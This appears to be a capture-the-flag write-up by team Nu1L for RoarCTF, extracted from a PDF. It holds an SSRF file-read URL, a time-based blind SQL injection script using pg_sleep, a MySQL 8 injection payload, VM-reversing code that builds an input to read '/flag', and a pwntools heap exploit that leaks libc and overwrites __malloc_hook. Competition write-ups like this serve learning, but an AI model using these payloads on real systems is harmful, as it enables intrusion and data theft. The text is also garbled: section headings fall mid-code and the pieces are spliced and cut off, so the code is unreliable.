ROARCTF WP By Nu1L
ROARCTF WP By Nu1L
Misc
Hi_433MHz
WEB
&Revenge
hackback
ezsql
HTML
PWN
easy_pwn
qtnc
2a1
RE
Singular DLP
steGO
slime_war
Crypto
ecdsa
Crypto_System
easyrsa
Misc
Hi_433MHz
WEB
&Revenge
http://47.104.232.98:36301/?url=file:///fl%2561g
import string
import sys
import requests
import time
payloads = string.ascii_letters + string.digits + '@#$%^&*()_+=[]!'
headers = {"Content-Type": "application/x-www-form-urlencoded"}
url = "http://139.129.98.9:30007/"
result = ''
for i in range(1, 20):
    for payload in payloads:
        starttime = time.time()
        p = 
"username=admin&password=aaa'||/**/(case/**/when/**/(select/**/substr(password
,%s,1)/**/from/**/users)='%s'/**/then/**/pg_sleep(5)/**/else/**/pg_sleep(0)/**
/end)||'x'--" % (i, payload)
        res = requests.post(url, data=p, headers=headers)
        if time.time() - starttime > 5:
            print(payload)
hackback
            result += payload
            break
        if payload == '!':
            print("fin:" + result)
            sys.exit(0)
import copy
opcode = [893, 192, 9, 966, 64, 129, 573, 129, 2, 454, 193, 66, 573, 130, 7, 
710, 66, 131, 445, 131, 8, 966, 131, 4, 701, 68, 6, 710, 196, 69, 893, 133, 9, 
966, 197, 6, 573, 6, 11, 710, 198, 199, 445, 71, 10, 966, 135, 136, 573, 200, 
4, 454, 8, 137, 829, 137, 11, 198, 201, 10, 957, 138, 12, 710, 74, 11, 701, 
203, 4, 710, 139, 76, 829, 76, 7, 454, 204, 205, 445, 141, 7, 454, 77, 78, 
573, 142, 10, 966, 142, 79, 765, 207, 4, 454, 207, 208, 701, 16, 3, 454, 208, 
145, 509, 17, 9, 454, 145, 146, 1021, 82, 4, 966, 82, 83, 765, 147, 6, 966, 
147, 212, 829, 84, 3, 198, 148, 149, 957, 213, 12, 454, 149, 86, 765, 22, 11, 
454, 214, 215, 637, 87, 13, 198, 215, 88, 893, 152, 4, 198, 216, 89, 445, 217, 
10, 966, 153, 218, 317, 218, 7, 710, 154, 155, 701, 155, 7, 710, 155, 92, 701, 
156, 2, 966, 220, 93, 381, 157, 6, 454, 157, 94, 573, 222, 6, 454, 158, 223, 
637, 223, 12, 966, 95, 96, 317, 96, 9, 710, 160, 97, 893, 33, 14, 454, 161, 
226, 765, 226, 7, 454, 98, 35, 381, 99, 8, 710, 99, 228, 317, 164, 11, 710, 
228, 165, 253, 37, 13, 966, 229, 230, 253, 166, 14, 710, 38, 39, 1021, 167, 
12, 966, 103, 168, 957, 40, 4, 710, 168, 105, 701, 105, 7, 966, 105, 128,
          701, 128, 13, 454, 64, 193, 509, 65, 8, 966, 193, 66, 637, 130, 12, 
966, 194, 67, 317, 3, 10, 710, 131, 4, 1021, 68, 3, 966, 196, 133, 957, 5, 9, 
710, 197, 134, 957, 6, 5, 966, 134, 71, 957, 7, 12, 710, 135, 136, 253, 136, 
13, 454, 72, 137, 637, 73, 11, 454, 9, 10, 317, 202, 12, 710, 74, 11, 445, 
139, 7, 966, 75, 204, 381, 204, 6, 454, 76, 205, 701, 77, 10, 198, 13, 14, 
573, 14, 8, 710, 78, 15, 253, 79, 9, 710, 143, 80, 957, 208, 13, 966, 16, 145, 
253, 17, 8, 454, 81, 82, 445, 18, 5, 710, 210, 147, 573, 147, 10, 198, 147, 
84, 957, 84, 7, 454, 148, 213, 445, 149, 13, 454, 21, 214, 573, 150, 4, 710, 
86, 87, 701, 215, 13, 454, 215, 24, 317, 152, 2, 454, 216, 153, 637, 89, 12, 
454, 153, 154, 829, 218, 10, 710, 90, 155, 957, 91, 12, 198, 27, 92, 893, 92, 
9, 454, 220, 93, 829, 221, 7, 454, 29, 158, 381, 222, 14, 710, 158, 95, 509, 
159, 5, 454, 223, 224, 381, 224, 11, 710, 224, 33, 1021, 225, 7, 198, 161, 98, 
573, 162, 13, 966, 98, 99, 509, 99, 7, 454, 163, 228, 509, 228, 13, 710, 36, 
37, 573, 293, 11, 966, 165, 230, 381, 230, 5, 710, 166, 167, 957, 167, 14, 
454, 39, 104, 317, 104, 6, 198, 40, 233, 637, 233, 10, 966, 233, 64, 999, 56, 
78]
class Info(object):
    def __init__(self, pc):
        self.opcode = opcode[pc]
        self.rax = opcode[pc+1]
        self.rbx = opcode[pc+2]
        self.tmp = opcode[pc+1]
        self.flag = 1
idx = 0
pc = 0
code = Info(pc)
def JudgeControl():
    global idx, code
    if code.opcode == 999:
        return 9
    if idx == 6 and code.flag == 0:
        code.rbx = 3
        idx = 0
        return 7
    elif idx == 6 and code.flag != 0:
        idx = 2
        return idx
    else:
        while ((code.opcode >> idx) & 1) == 0:
            idx += 1
        return idx
tpl = [0xff for _ in range(42)]
target = "readfile('/flag');#"
target += '\x00'*(42-len(target))
for t in range(len(target)-1, -1, -1):
    for i in range(256):
        idx = 0
        pc = 0
        code = Info(pc)
        inp = copy.deepcopy(tpl)
        inp[t] = i
        flag = 0
        stack = 0
        while flag != 1:
            p = JudgeControl()
            if p == 0:
                code.rax = inp[code.rax % 64]
            elif p == 1:
                code.rax = inp[code.rax % 64]
                code.rbx = inp[code.rbx % 64]
            elif p == 2:
                stack = code.rax ^ code.rbx
            elif p == 3:
ezsql
Mysql8
admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)>
(BINARY('{}'),'0')#
flag
                code.rbx = code.rax & code.rbx
            elif p == 4:
                code.rbx  EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
aaaaaaaaaaaaaaaaa -> aaaaaaaaaaaaaaaaa
exit
'''
p.send(g)
edit('EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE','aaa')
p.sendline('2')
p.recvuntil('choice:')
# launch_gdb()
# raw_input()
payload = 'E' * 0x20 + p64(0) + p64(0x31) + p64(0) + 'E' * 0x18+ \
p64(0x30)+ p64(0x31) + p8(0x20)
edit('aaaEEEEEEEEEEEEEEEEEEEEEEEEEEEEE',payload)
p.recvuntil('choice:')
p.sendline('2')
p.recvuntil('aaa -> ')
leak_heap = u64(p.recv(6) + '\x00\x00')
log.info('leak heap ' + hex(leak_heap))
heap_libc_addr = leak_heap + (0x340-0x260)
payload = 'E' * 0x20 + p64(0) + p64(0x31) + p64(0) + 'E' * 0x18+ \
p64(0x30)+ p64(0x31) + p64(heap_libc_addr)
edit('EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE',payload)
p.recvuntil('choice:')
p.sendline('2')
p.recvuntil('aa -> ')
leak_libc = u64(p.recv(6) + '\x00\x00') - 3951496
log.info('leak libc ' + hex(leak_libc))
payload = 'E' * 0x20 + p64(0) + p64(0x31) + p64(0) + 'E' * 0x18+ \
p64(0x30)+ p64(0x31) + p64(heap_libc_addr) + p64(0x11) * 2 + p64(0) * 2 +\
p64(0x51) + p64(leak_heap - 0x230) + 'a' * 7 * 8 + p64(0) + p64(0x21) + \
p64(leak_libc + 3951496) * 2 + p64(0x20) + p64(0x30) + p64(leak_heap + 0x130)
qtnc
dump_byte = 
[0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x45,0x45,0x45,0x45,0x45,0x45,0x4
5,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0
x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x45,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x61,0x61,0x61,0x61,0x61,0x
61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0
0,0x00,0x00,0x00,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x20,0x00,0x00,0
x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x40,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
for i in dump_byte:
    payload += chr(i)
payload += p64(leak_libc + libc.symbols['__malloc_hook']-0x10) + p64(6) * 2
edit('EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE',payload)
p.recvuntil('choice:')
p.sendline('2')